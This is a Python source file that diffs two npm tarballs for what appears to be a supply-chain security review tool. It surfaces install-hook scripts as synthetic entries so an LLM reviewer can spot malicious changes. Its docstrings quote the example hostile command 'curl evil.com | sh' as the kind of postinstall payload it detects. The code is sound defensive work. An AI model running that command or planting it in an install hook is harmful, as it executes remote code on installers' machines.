"""NPM diff extractor — compares two npm tarballs (.tgz)."""

from __future__ import annotations

import json
import logging
import os
import tarfile

from extractors_diff._common import (
    DEFAULT_MAX_AGGREGATE_BYTES,
    DEFAULT_MAX_FILES,
    MAX_FILE_BYTES,
    DiffPayload,
    diff_files,
    empty_payload,
    is_install_hook,
    is_path_traversal,
    normalize_path,
)

logger = logging.getLogger(__name__)

INSTALL_HOOKS = {"preinstall", "install", "postinstall"}


def extract(new_path: str, old_path: str, *, original_filename: str = "") -> DiffPayload:
    """Compare two npm tarballs and return a DiffPayload.

    Surfaces install-hook script *values* from package.json scripts as
    synthetic file entries (npm:scripts/<hook>) so the LLM sees a
    postinstall change like `curl evil.com | sh` even though the actual
    JSON edit may be drowned out by reformatted package.json content.
    """
    payload = empty_payload()
    new_files = _read_tgz(new_path, payload, "new")
    if payload["error"]:
        return payload
    old_files = _read_tgz(old_path, payload, "old")
    if payload["error"]:
        return payload

    # Inject synthetic entries for install-hook script *values* so the diff
    # captures malicious payloads embedded in package.json scripts.
    _inject_npm_script_synthetic(new_files)
    _inject_npm_script_synthetic(old_files)

    diff_files(new_files, old_files, "npm", payload, install_hook_detector=_npm_hook)
    return payload


def _read_tgz(path: str, payload: DiffPayload, side: str) -> dict[str, bytes | None]:
    """Read all members of an npm tarball into {normalized_path: bytes | None}.

    None marks "oversize, content suppressed" — distinct from b"" (truly empty
    file) so empty files round-trip correctly.
    """
    if not os.path.isfile(path):
        payload["error"] = f"{side} artifact not found: {path}"
        return {}

    out: dict[str, bytes | None] = {}
    aggregate = 0
    file_count = 0
    try:
        with tarfile.open(path, "r:gz") as tf:
            for member in tf.getmembers():
                # Skip symlinks/hardlinks — they could point outside the archive.
                if member.issym() or member.islnk():
                    logger.warning("npm diff extractor: skipping link %r", member.name)
                    continue
                if not member.isfile():
                    continue
                norm = normalize_path(member.name)
                if is_path_traversal(member.name) or is_path_traversal(norm):
                    logger.warning("npm diff extractor: skipping traversal path %r", member.name)
                    continue

                file_count += 1
                if file_count > DEFAULT_MAX_FILES:
                    payload["partial"] = True
                    break

                if member.size > MAX_FILE_BYTES:
                    out[norm] = None
                    continue

                try:
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    blob = f.read(MAX_FILE_BYTES + 1)
                except Exception as e:
                    logger.warning("npm diff extractor: read failed for %s: %s", member.name, e)
                    continue

                if len(blob) > MAX_FILE_BYTES:
                    out[norm] = None
                    continue

                aggregate += len(blob)
                if aggregate > DEFAULT_MAX_AGGREGATE_BYTES:
                    payload["partial"] = True
                    out[norm] = None
                    break

                out[norm] = blob
    except Exception as e:
        payload["error"] = f"{side} tar.gz open failed: {e}"
        return {}
    return out


def _inject_npm_script_synthetic(files: dict[str, bytes | None]) -> None:
    """Surface install-hook script values as synthetic file entries.

    Inserts npm:scripts/<hook> entries with the script command as content so the
    diff can detect a postinstall change like 'curl evil.com | sh'.
    """
    pkg_path = "package/package.json" if "package/package.json" in files else None
    if pkg_path is None:
        return
    blob = files.get(pkg_path)
    if not blob:
        # Either missing, oversize-sentinel (None), or genuinely empty.
        return
    try:
        pkg = json.loads(blob.decode("utf-8", errors="replace"))
    except Exception:
        return
    if not isinstance(pkg, dict):
        return
    scripts = pkg.get("scripts", {})
    if not isinstance(scripts, dict):
        return
    for hook in INSTALL_HOOKS:
        cmd = scripts.get(hook)
        if isinstance(cmd, str) and cmd:
            files[f"npm:scripts/{hook}"] = cmd.encode("utf-8")


def _npm_hook(ecosystem: str, path: str) -> bool:
    """NPM-specific install-hook detector. Marks synthetic npm:scripts/* entries."""
    if path.startswith("npm:scripts/"):
        return True
    return is_install_hook(ecosystem, path)
